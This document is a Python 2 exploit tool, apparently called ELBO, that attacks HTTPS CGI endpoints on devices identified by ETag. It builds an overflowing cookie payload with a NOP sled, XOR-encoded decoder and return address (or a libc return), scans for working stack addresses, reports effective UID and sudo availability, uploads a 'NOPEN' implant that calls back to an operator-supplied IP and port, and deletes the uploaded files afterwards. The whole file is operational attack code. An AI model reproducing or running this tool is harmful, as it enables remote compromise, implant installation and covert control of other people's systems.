#!/usr/bin/python

import shellcode
import optparse
import httplib
import logging
import random
import socket
import sys
import re
from struct import pack, unpack
from time import sleep

########################
# Global configuration #
########################
DEFAULT_ETAG_FILE = "ELBO.config"
VERSION = "%prog v1.0.0.0"

####################################################################
# Add support for python 2.3 and 2.4                               #
####################################################################
# 2.3 introduced Set, so anything older won't work anyway
# 2.4 introduced the set builtin, so anything newer works fine
if sys.version_info[0] <= 2 and sys.version_info[1] <= 3:
    import sets
    set = sets.Set
# "any" was introduced in 2.5
if sys.version_info[0] == 2 and sys.version_info[1] < 5:
    def any(iterable):
        for e in iterable:
            if e:
                return True
        return False

#####################
# Support functions #
#####################
def read_etag_file(options):
    """Returns a nested dictionary of the form:
    { etag-string: { "stack"  : stack-address,
                     "version": software-version },
      ... }"""
    tags = dict()
    noserver = None
    have_errors = False

    options.scanplan = []

    # split etag into its components
    (inode, size, timestamp) = [int(x, 16) for x in options.etag.split("-")]
    logging.info("Parsed ETag: inode=%d, filesize=%d, timestamp=%#x" %
                 (inode, size, timestamp))

    fh = file(options.etag_file)
    for line in [x.strip() for x in fh.readlines()]:
        line = re.sub("\s*#.*", "", line) # remove trailing comments
        if len(line) == 0: continue # skip blank lines
        m1 = re.match("ETAG\s*=\s*(.+)", line)
        m2 = re.match("NOSERVER\s*=\s*(.+)", line)
        m3 = re.match("SCANPLAN\s*=\s*(.+)", line)

        if not (m1 or m2 or m3):
            print "ERROR: invalid line in etag file: [%s]" % line
            have_errors = True
            continue
        if m1: # an "ETAG = ..." line
            fields = dict(zip(["etag", "action", "stack", "version"],
                              [x.strip() for x in m1.group(1).split(":")]))

            if len(fields) == 3:
                fields["version"] = "unknown"
            elif len(fields) != 4:
                print "ERROR: invalid line in etag file: [%s]" % line
                have_errors = True
                continue

            # skip actions that don't match the --action command line argument
            if options.action not in fields["action"]:
                logging.debug("Skipping configuration [%s:%s] due to --action" %
                              (fields["etag"], fields["action"]))
                continue

            # convert hex numbers to actual numbers (not strings)
            if fields["stack"].startswith("0x"):
                fields["stack"] = long(fields["stack"], 16)

            if fields["etag"] not in tags:
                tags[fields["etag"]] = []

            tags[fields["etag"]].append(dict(action=fields["action"],
                                             stack=fields["stack"],
                                             version=fields["version"]))
        elif m2: # a "NOSERVER = ..." line
            noserver = m2.group(1)
        elif m3: # a "SCANPLAN = ..." line
            fields = dict(zip(["action","low","high","addrs"],
                              [x.strip() for x in m3.group(1).split(":")]))

            if options.action not in fields["action"]:
                logging.debug("Skipping scanplan [%s:%s:%s] due to --action" %
                              (fields["action"], fields["low"], fields["high"]))
                continue
            fields["low"] = long(fields["low"], 16)
            fields["high"] = long(fields["high"], 16)

            addrs = [x.strip() for x in fields["addrs"].split(",")]
            addrs = [x.startswith("0x") and long(x,16) or x for x in addrs]

            # if the etag we want to hit is in this SCANPLAN, add it
            if timestamp >= fields["low"] and timestamp <= fields["high"]:
                scanplan = [dict(action=fields["action"], stack=x)
                            for x in addrs]
                if options.maxfailsaction > 0:
                    options.scanplan += scanplan[:options.maxfailsaction]
                else:
                    options.scanplan += scanplan

    fh.close()

    if have_errors:
        sys.exit(1)

    return (tags, noserver)

def get_details_for_etag(options):
    """Get the stack address for a specific ETag from the configuration file."""
    (tags, noserver) = read_etag_file(options)

    if noserver and not options.noserver:
        options.noserver = noserver

    # strip off wacky W/ and quotes (if they're there)
    m = re.match('(?:W/)?"?(.*)"?$', options.etag)
    if m:
        options.etag = m.group(1)
    etag = options.etag

    # look for an exact match
    if etag in tags:
        print "Found etag [%s] for version %s" % (etag,tags[etag][0]['version'])
        return tags[etag]
    
    # didn't find exact match - strip off the inode part and check again
    short = etag[etag.index("-"):]

    for t in tags:
        if t.find(short) != -1:
            print "Partial ETag match: [%s],[%s] for version %s" % \
                (etag, t, tags[t][0]['version'])
            return tags[t]
    
    return None

def encode(string):
    """Encode string argument (XOR with a mask byte) to remove any
    forbidden characters."""
    bad = ['\x00', '\t', ' ', '\r', '\n']
    start = random.randint(1, 255)
    maskb = (start + 1) & 0xff

    while maskb != start:
        if chr(maskb) in bad:
            maskb = (maskb + 1) & 0xff
            continue
        
        # mask all arguments
        string = "".join(map(lambda x: chr(maskb ^ ord(x)), string))

        # see if we got rid of all bad characters
        if not any([x in string for x in bad]):
            return (maskb, string)

        # unmask for next try
        string = "".join(map(lambda x: chr(maskb ^ ord(x)), string))

        # incr mask
        maskb = (maskb + 1) & 0xff

    raise Exception("Could not find valid mask byte.")

def build_payload(options, address, libc):
    """Build the exploit cookie + post data payload."""
    if options.op == "scan":
        body = shellcode.probe
    elif options.op == "nopen":
        body = shellcode.nopen

        # fill in noserver file length and callback ip/port
        body = body[:2] + \
            pack("<I", len(shellcode.tiny_exec)) + \
            pack("<I", len(options.nopen)) + \
            pack("35s", "D=-c%s" % options.callback_ip) + \
            body[45:]
    elif options.op == "cleanup":
        body = shellcode.cleanup
    else:
        raise Exception("ERROR: Invalid operation specified.")

    if libc:
        cookie = shellcode.auth_id
        bodylen = len(body)
        if bodylen > 0xffff:
            raise Exception("body must be <= 0xffff bytes long")
        # fill in bodylen in auth_id shellcode
        if (bodylen & 0xff00) == 0:
            cookie = cookie[:10] + "\x90\x90" + cookie[12:]
        else:
            cookie = cookie[:11] + chr((bodylen & 0xff00) >> 8) + cookie[12:]
        if (bodylen & 0xff) == 0:
            cookie = cookie[:12] + "\x90\x90" + cookie[14:]
        else:
            cookie = cookie[:13] + chr(bodylen & 0xff) + cookie[14:]
        if len(cookie) > 60:
            raise Exception("ERROR: Cookie shellcode must be <= 60 bytes!")
        cookie = "auth_id=" + chr(0x90)*(60 - len(cookie)) + cookie
        cookie += pack("<I", address)
    else:
        decoder = shellcode.decoder
        execute = shellcode.execute_post

        exec_len = pack("<I", len(execute))
        deco_len = pack("<I", len(decoder))
        body_len = pack("<I", len(body))

        # replace 0xdeadbeef with actual body length
        execute = execute[:7] + body_len + execute[11:]

        (maskb, string) = encode(execute + exec_len + deco_len)
        execute  = string[:-8]
        exec_len = string[-8:-4]
        deco_len = string[-4:]

        maskw = chr(maskb)*4
        decoder = decoder[0] + deco_len + decoder[5] + maskw + \
            decoder[10:15] + exec_len + decoder[19:21] + maskw + \
            decoder[25:29] + chr(maskb) + decoder[30:]

        cookie = shellcode.finder + decoder + execute
        if len(cookie) > 1036:
            raise Exception("ERROR: Cookie shellcode must be <= 1036 bytes!")
        sled_len = (1036 - len(cookie)) # 1036 = buffer len to overflow

        logging.info("Using decoder masking byte %#x" % maskb)
        logging.info("Using %d-byte NOP sled" % sled_len)
        cookie = chr(0x90)*sled_len + cookie + pack("<I", address)
    
    if options.op == "nopen":
        return (cookie, body + options.nopen + shellcode.tiny_exec)
    else:
        return (cookie, body)

def get_response(options, address):
    """Send an exploit to the target and get its response."""
    # some addresses are fake, so we remap them here
    remap_addr = { 'libc.0': 0x0804a625L, 'libc.1': 0x2aab757c }
    method = "GET"

    if address["stack"] in remap_addr:
        real_addr = remap_addr[address["stack"]]
        (cookie, body) = build_payload(options, real_addr, libc=True)
    else:
        (cookie, body) = build_payload(options, address["stack"], libc=False)
    
    conn = httplib.HTTPSConnection(options.target_ip, options.port)

    if logging.getLogger().level <= logging.DEBUG:
        if len(body) + len(cookie) > 10240:
            logging.debug("WARNING: debug mode selected, but the amount of " +
                          "data being sent to the server is large (> 10kb). " +
                          "Temporarily disabling debug output.")
        else:
            conn.set_debuglevel(3)

    logging.info("Sending %s request (%d-byte cookie) to https://%s:%s%s" %
                 (method, len(cookie), options.target_ip, options.port,
                  address["action"]))

    try:
        conn.request(method, address["action"], body=body,
                     headers={"Cookie": cookie})
    except socket.error, e:
        print "Connection error %d: %s" % tuple(e)
        sys.exit(1)
    return conn.getresponse()

####################
# "Main" functions #
####################
def scan(options):
    """Scan for which vulnerability / stack address to use"""
    addrs = get_details_for_etag(options)

    if addrs is None:
        addrs = options.scanplan
        if options.maxfails > 0:
            addrs = addrs[:options.maxfails]
    else:
        logging.info("--scan initiated against a known version: Only " +
                     "sending one scan (expect success!)")

    logging.debug("scanplan = [" +
                  ",".join(["(%s, %s)" % (x["action"],
                                          type(x["stack"]) == long and \
                                              ("%#010x" % x["stack"]) or \
                                              x["stack"])
                            for x in addrs]) +
                  "]")

    if len(addrs) == 0:
        print "ERROR: No valid SCANPLAN found for your ETag. If you supplied an --action argument, try again without it. Otherwise, contact a developer."
        return

    skip_404 = dict() # CGI's that aren't on the target
    for (i,addr) in enumerate(addrs):
        logging.info("------------------------------------------------")
        if type(addr["stack"]) == str:
            print "Atmpt. %d of %d: Trying return to %s against %s" % \
                (i+1, len(addrs), addr["stack"], addr["action"])
        else:
            print "Atmpt %d of %d: Trying stack addr %#010x against %s" % \
                (i+1, len(addrs), addr["stack"], addr["action"])

        cgi_name = addr["action"][:addr["action"].find("?")]
        if cgi_name in skip_404:
            logging.info("... skipped due to HTTP %d" % skip_404[cgi_name])
            continue

        resp = get_response(options, addr)

        logging.info("  received HTTP %s %s" % (resp.status, resp.reason))

        if resp.status == 200:
            address = addr
            break
        if resp.status >= 300 and resp.status < 500:
            skip_404[cgi_name] = resp.status
            logging.info("Skipping all future scans against %s due to HTTP status" % cgi_name)
        sleep(options.delay)

    if resp.status != 200:
        if len(addrs) == 1 and options.maxfails != 1:
            print "ERROR: Vulnerability parameter recorded in %s FAILED." % \
                options.etag_file
            print "       Try deleting the entry and running --scan again."
        else:
            print "All scans failed. No vulnerability found."
        return

    data = resp.read()
    logging.debug("received data(%d): %s" % (len(data), repr(data)))
    
    if len(data) < 16:
        print "ERROR: Expected at least 16 bytes from exploit, but only " + \
            "got %d" % len(data)
        return
    
    code_ack    = 0xc0edbabeL
    code_sudo   = 0x900d50d0L
    code_nosudo = 0xbad500d0L
    code_root   = 0xb00500d0L
    code_exec   = 0xbaade7ecL

    (ack, stack, euid, sudo) = unpack("<IIII", data[:16])

    if ack == code_ack:
        data = data[16:]
        print "Received ACK from exploit payload."
        print "================================================="
        print "Effective UID: %d" % euid
        if sudo == code_sudo:
            print "/tos/bin/sudo appears to be available."
            print "Output of '/tos/bin/sudo /usr/bin/id':"
            if unpack("<I", data[:4])[0] == code_exec:
                print "  ERROR: execve() failed!"
            else:
                print data
            data = ""
        elif sudo == code_nosudo:
            print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            print "/tos/bin/sudo is NOT available!"
            print "May not be able to escalate privileges!"
            print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
        elif sudo == code_root:
            print "Already root, so skipping sudo check"
        else:
            print "Unknown sudo status: got %#x but expected %#x or %#x" % \
                (sudo, code_sudo, code_nosudo)
        if len(data):
            print "Received unexpected data:", repr(data)
        print "================================================="
        if type(address["stack"]) == str:
            print "Successful libc exploit."
            config_line = "   ETAG = %s : %s : %s" % \
                (options.etag, address["action"], address["stack"])
        else:
            print "Successful probe stack address: %#010x" % address["stack"]
            print "Exact stack address           : %#010x" % stack
            config_line =  "   ETAG = %s : %s : %#010x" % \
                (options.etag, address["action"], stack)
        if len(addrs) == 1:
            print "Vulnerability for ETag [%s] confirmed!" % options.etag
        else:
            print "Add this line to %s:" % options.etag_file
            print config_line
            print "and then add the version column when known."
    else:
        print "ERROR! Received invalid ack word [%#x] vs [%#x]" % (ack,code_ack)
        print "received (%d): %s" % (len(data), repr(data))
        print "Exploit failed."

def nopen(options):
    """Upload noserver to the target and have it call back"""
    addr = get_details_for_etag(options)
    if addr is None:
        logging.error("ERROR: No entry for ETag [%s] in %s." %
                      (options.etag, options.etag_file))
        logging.error("       Perhaps you should run with --scan?")
        return

    if not options.noserver:
        options.parser.error("--nopen also requires -n/--noserver or a " +
                             "NOSERVER entry in %s" % options.etag_file)
    if not options.callback_ip:
        options.parser.error("--nopen also requires -c/--callback!")

    try:
        fh = file(options.noserver)
        options.nopen = fh.read()
        fh.close()
    except:
        print "ERROR: Could not read noserver file [%s]" % (options.noserver)
        return

    codes = {
        0xdeadbeefL: "Received ACK from exploit. Uploading NOPEN.",
        0xc0edbabeL: "Uploaded NOPEN! Callback commencing.",
        0x00000001L: "ERROR: Could not read POSTed NOPEN binary.",
        0x00000002L: "ERROR: Could not write NOPEN binary to target disk.",
        0x00000003L: "ERROR: Unexpected EOF while uploading NOPEN binary.",
        0x00000004L: "ERROR: Could not open() upload filename on target.",
        0x00000005L: "ERROR: exeve() on uploaded NOPEN binary failed.",
        0x00000006L: "warning: Could not close() uploaded file on target. Continuing anyway. (Is there another NOPEN session already alive?)",
        0x00000007L: "warning: sudo failed! Running NOPEN as nobody.",
        }

    resp = get_response(options, addr[0])

    while True:
        try:
            data = resp.read(4)
        except ValueError:
            break

        if len(data) == 0:
            break

        logging.debug("received data(%d): %s" % (len(data), repr(data)))

        code = unpack("<I", data)[0]
        if code in codes:
            print codes[code]
        else:
            print "ERROR: Unknown status code %#010x" % code
            data += resp.read()
            print data
            break

def cleanup(options):
    """Try to delete uploaded files from the target"""
    # extract uploaded filenames from shellcode
    null0 = shellcode.cleanup.index("\x00")
    null1 = shellcode.cleanup.index("\x00", null0+1)
    noserver_upload = shellcode.cleanup[2:null0]
    tinyexec_upload = shellcode.cleanup[null0+1:null1]
    codes = {
        0x00000002L: "ERROR: unlink('%s') (%s) - cleanup NOT successful - file is still sitting on target!",
        0x00000100L: "success: stat('%s') (%s) - file is sitting on target",
        0x00000200L: "success: unlink('%s') (%s) - file removed from target",
        }
    masks = {
        0x00010000L: (noserver_upload, 'noserver'),
        0x00020000L: (tinyexec_upload, 'tiny-exec'),
        }
    orig_codes = codes.keys()
    for m in masks:
        for c in orig_codes:
            codes[m ^ c] = codes[c] % masks[m]
    for c in orig_codes:
        del codes[c]
    codes[0x00010001L] = "warning: stat() on '%s' (noserver) failed - file not uploaded? This may be normal if the exploit upload failed or the file was deleted manually." % noserver_upload
    codes[0x00020001L] = "warning: stat() on '%s' (tiny-exec) failed - file not uploaded? This may be normal if the exploit upload failed, the file was deleted manually, or we did not need to upload tiny-exec (i.e., we were already running as EUID root)." % tinyexec_upload

    addr = get_details_for_etag(options)
    if addr is None:
        logging.error("ERROR: No entry for ETag [%s] in %s." %
                      (options.etag, options.etag_file))
        logging.error("       Perhaps you should run with --scan?")
        return

    resp = get_response(options, addr[0])
    data = resp.read()
    logging.debug("received data(%d): %s" % (len(data), repr(data)))
    if len(data) % 4 != 0:
        print "ERROR: Expected 4-byte status codes but got %d bytes:"%len(data)
        print repr(data)
        return
    
    from_exploit = unpack("<" + ("I" * (len(data)/4)), data)
    for code in from_exploit:
        if code in codes:
            print codes[code]
        else:
            print "ERROR: Unknown status code %#010x" % code

def main():
    """Parse command line arguments"""
    def handle_op_arg(option, opt_str, value, parser, opname):
        if parser.values.op:
            raise optparse.OptionValueError(
                "Only one of --probe, --scan, --nopen, or --cleanup should " +
                "be supplied")
        parser.values.op = opname

    parser = optparse.OptionParser(version=VERSION, usage="""%prog [options]

See -h for specific options (some of which are required).

Examples:

Scan to find (unknown versions) or confirm (known versions) vulnerability:
  %prog -t 1.2.3.4 -e 012-345-6789 --scan -v

Once a valid entry is in ELBO.config, upload nopen:
  %prog -t 1.2.3.4 -e 012-345-6789 --nopen -n noserver -c 5.6.7.8:12345 -v

Delete uploaded files from the previous step:
  %prog -t 1.2.3.4 -e 012-345-6789 --cleanup -v""")

    parser.add_option("-t", "--target-ip", dest="target_ip", action="store",
                      type="string", help="Target's IP address")
    parser.add_option("-e", "--etag", dest="etag", action="store",
                      type="string", help="Target's ETag string")
    parser.add_option("--scan", dest="op", action="callback",
                      callback=handle_op_arg, callback_args=("scan",),
                      help="Scan for vulnerability parameters")
    parser.add_option("--delay", dest="delay", action="store", type="int",
                      default=1, help="Delay in seconds between probes " +
                      "during --scan (default=1 second)")
    parser.add_option("-f", "--max-fails", dest="maxfails", action="store",
                      type="int", default=0, help="Total maximum number of " +
                      "failed scan attempts before aborting (default=0, run " +
                      "all scans); see also --max-fails-action")
    parser.add_option("--max-fails-action", dest="maxfailsaction",
                      action="store", type="int", default=0, help="Maximum " +
                      "number of failed scan attempts on a single target " +
                      "CGI action before moving on to the next (default=0, " +
                      "run all scans)")
    parser.add_option("--nopen", dest="op", action="callback",
                      callback=handle_op_arg, callback_args=("nopen",),
                      help="Upload NOPEN to target (requires -n and -c)")
    parser.add_option("-n", "--noserver", dest="noserver", action="store",
                      type="string", help="Path to static noserver binary " +
                      "(overrides NOSERVER setting in %s)" % DEFAULT_ETAG_FILE)
    parser.add_option("-c", "--callback", dest="callback_ip", action="store",
                      type="string", help="Callback IP:Port for --nopen " +
                      "(e.g., 127.0.0.1:12345")
    parser.add_option("--cleanup", dest="op", action="callback",
                      callback=handle_op_arg, callback_args=("cleanup",),
                      help="Try to delete uploaded files from target")
    parser.add_option("-p", "--port", dest="port", action="store", type="int",
                      default=443, help="Destination port (default=443)")
    parser.add_option("--config", dest="etag_file", action="store",
                      type="string", default=DEFAULT_ETAG_FILE,
                      help="ETag configuration file (default=%s)" % 
                      DEFAULT_ETAG_FILE)
    parser.add_option("-v", "--verbose", dest="verbose", action="store_true",
                      help="Turn on verbose output")
    parser.add_option("-d", "--debug", dest="debug", action="store_true",
                      help="Turn on debugging output")
    parser.add_option("--action", dest="action", action="store", type="string",
                      default="", help="Only try actions from ELBO.config " +
                      "that contain ACTION as a substring")

    (options, args) = parser.parse_args()

    if len(args) != 0:
        parser.error("invalid arguments")

    # make sure we have a target IP and his ETag
    if not options.target_ip:
        parser.error("-t/--target-ip is required!")
    if not options.etag:
        parser.error("-e/--etag is required!")

    # handle -v and -d via logging module
    level = logging.ERROR
    if options.verbose:
        level = logging.INFO
    if options.debug:
        level = logging.DEBUG
    logging.basicConfig()
    logging.getLogger().setLevel(level)
    logging.getLogger().handlers[0].setFormatter(logging.Formatter("%(msg)s"))

    options.parser = parser

    # dispatch to the correct operation
    if not options.op:
        parser.error("One of --scan, --nopen, or --cleanup must " +
                     "be supplied")

    dispatch = dict()
    for func in [scan, nopen, cleanup]:
        dispatch[func.func_name] = func
    dispatch[options.op](options)

    return

if __name__ == '__main__':
    main()
